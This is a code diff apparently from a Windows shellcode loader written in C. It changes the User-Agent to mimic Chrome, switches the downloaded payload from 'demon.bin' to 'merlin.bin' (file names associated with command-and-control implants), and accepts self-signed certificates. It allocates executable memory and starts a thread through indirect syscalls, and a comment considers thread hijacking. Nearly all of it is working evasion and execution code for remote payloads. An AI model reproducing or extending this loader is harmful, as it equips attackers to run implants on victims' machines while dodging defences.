@@ -10,7 +10,7 @@
 #pragma comment(lib, "winhttp.lib")
 //#pragma comment(lib, "ntdll")
 
-unsigned char buf[101375];
+unsigned char buf[22148113];
 
 
 
@@ -293,6 +293,8 @@ VOID SharedSleep(IN ULONG64 uMilliseconds) {
 // -------------------------------- //// -------------------------------- //// -------------------------------- //
 void dl(const wchar_t* host, short port)
 {
+
+	LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
 	int counter = 0;
 	NTSTATUS state = 0x00;
 	DWORD dwSize = 0;
@@ -304,7 +306,7 @@ void dl(const wchar_t* host, short port)
 		hRequest = NULL;
 
 	// Use WinHttpOpen to obtain a session handle.
-	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
+	hSession = WinHttpOpen(userAgent,
 		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 0);
@@ -317,7 +319,7 @@ void dl(const wchar_t* host, short port)
 
 	// Create an HTTP request handle.
 	if (hConnect)
-		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/demon.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+		hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/merlin.bin", L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
 	// This is for accepting self signed Cert
 	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
@@ -430,6 +432,12 @@ VOID Exec() {
 	NTSTATUS state = 0x00;
 	SIZE_T regionSize = sizeof(buf);
 	//exec_mem = VirtualAlloc(NULL , sizeof(buf) , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
+
+
+	/*
+		Remember to Free this memory 
+		
+	*/
 	SET_SYSCALL(sys_func.NtAllocateVirtualMemory);
 	state = RedroExec((HANDLE)-1, &exec_mem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!exec_mem) {
@@ -440,16 +448,19 @@ VOID Exec() {
 	myprintf("wiriten to 0x%p \n" , exec_mem);
 	
 	PULONG pOldProtect = NULL;
-	SharedSleep(2 * 1000);
+	//SharedSleep(2 * 1000);
 
-	/*SET_SYSCALL(sys_func.NtProtectVirtualMemory);
-	state = RedroExec((HANDLE)-1, &exec_mem, &regionSize, PAGE_EXECUTE_READWRITE, pOldProtect);
-	if (state !=0x00) {
-		myprintf("failed to change protect 0x%X \n" , state);
-		return;
-	}*/
-	//myprintf("changed protect\n");
+	myprintf("hProcess: 0x%p, Base: 0x%p, RegionSize: %lu, NewProtect: 0x%X\n", hProcess, exec_mem, regionSize, PAGE_EXECUTE_READWRITE);
+	
+	
+	myprintf("changed protect\n");
 	//hThread = CreateThread(NULL , 0 ,(LPTHREAD_START_ROUTINE)exec_mem , NULL , 0 , NULL);
+	
+	/*
+		TRy thread hijacking with context change ????
+	*/
+
+
 	SET_SYSCALL(sys_func.NtCreateThreadEx);
 	if ((state = RedroExec(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, exec_mem, NULL, TRUE, NULL, NULL, NULL, NULL)) != 0x00) {
 		myprintf("create thotho failed : 0x%X \n", state);
